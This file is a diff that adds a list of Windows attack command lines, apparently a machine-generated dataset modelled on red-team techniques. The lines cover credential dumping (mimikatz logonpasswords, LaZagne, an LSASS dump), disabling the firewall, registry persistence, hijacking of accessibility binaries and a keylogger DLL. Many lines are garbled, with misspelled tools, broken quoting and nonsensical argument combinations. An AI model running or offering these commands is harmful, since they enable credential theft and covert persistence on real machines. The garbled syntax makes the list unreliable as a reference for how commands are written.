@@ -1,0 +1,64 @@
+reg add `` hklm\system\currentcontrolset\control\session manager\environment '' /v `` cor_profiler '' '' /f
+namp -sn $ { user_name } -l $ true
+net stop w32time
+set-executionpolicy -executionpolicy | 'https : 325 '' '' ;
+reg add `` username '' yes
+python zero_padding.py $ { file_name } ''
+net user administrator
+sekurlsa : :logonpasswords
+lazagne.exe windows
+netsh advfirewall set opmode mode=disable
+lazagne.exe windows
+set programw6432= $ { wait_ms } and where ( set \\ $ { copy path }
+$ shortcut.workingdirectory = `` $ `` ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } @ `` '' '' `` @ '' )
+at.exe $ { time } . $ : \windows\system32\sethc.exe
+sekurlsa : :logonpasswords
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file execution options\spoolsv.exe '' /v '' /ve /d `` autorun '' '' , , $ { system32_binary } '' '' -force }
+iediagcmd.exe /out : $ { ip_address } -u -l $ { command }
+ffuf -w $ { command }
+$ a = `` $ { malicious_exe_path } ; -t $ { vulnerable_version_of_amsi.dll } '' rundll32.exe % \system32\osk.exe ''
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows '' /v `` cor_profiler '' '' /v `` threadingmodel '' c : binary__file_path } ''
+net user administrator /domain :
+rdrleakdiag.exe /p $ { mask }
+netsh.exe add `` kerberos : :list /export '' `` $ { weak_service_name } ) ;
+net group `` domain /domain
+$ wscriptshell = new-object -comobject ( ) ; full :
+python zero_padding.py $ { service_name } command= $ { command }
+hack-browser-data-windows-64bit.exe
+pktmon.exe start keylogger_dll.dll , administrators : { attached }
+lazagne.exe all
+icacls % windir % \system32\osk.exe
+get-item -path $ { target t1547.009 . '' ;
+conhost.exe [ net.servicepointmanager appdata % \updater.exe -command $ ( reply '' /f
+cmdkey.exe /list
+copy-item `` cor_enable_profiling '' /f
+copy c : \users\
+`` $ shell = new-object -comobject : -comobject ) '' query= '' -class activescripteventconsumer options\svchost.exe ''
+copy `` localaccount=true /user $ { lsass_pid } -l $ { path } ; and @ ( $ i \appdata\local\temp\lsass.dmp full
+invoke-mimikatz.exe
+pktmon.exe start -- etw
+cmdkey.exe /list
+sc.exe create $ { user_name }
+workfolders
+reg add `` hklm\software\microsoft\windows nt\currentversion\silentprocessexit\svchost.exe '' /v `` appinit_dlls '' /f
+rundll32 popcalc.dll , tmp.run file file } , disable mainwindowtitle
+.\tshark -i $ { flie_name } abc.exe.txt
+python zero_padding.py $ { file_name } in $ { scr_path }
+reg query hklm\software\microsoft
+net user administrator /domain
+namp -sn -u $ { username }
+reg add `` hkey_local_machine\software\microsoft\windows setup\installed hklm\systyem } , keylog
+$ consumerargs = @ $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } ;
+net user /domain
+net group `` domain
+get-wmiobject win32_computersystem | select-object -expandproperty command
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v logon /d `` 1 '' /v 0 disable /failure : disable
+namp -sn $ { domain }
+reg add `` hklm\software\microsoft\windows nt\currentversion\silentprocessexit\svchost.exe '' /v `` threadingmodel '' /t reg_dword /d 0 /d 1 /d bypass
+reg add `` hklm\system\currentcontrolset\services\ $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } \inprocserver32 '' -asplaintext -force )
+`` $ shell = new-object -comobject ( ) '' wql '' '' )
+net user `` $ { username } -p $ { target_ip }
+nmap -o $ { output_file }
+reg add `` commandline popcalc.dll , string , ) '
+reg add `` hklm\software\microsoft\windows manager\environment '' /v `` atomic -value -ibck $ { outpout_file }
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v impersonate /d 1 1 ''
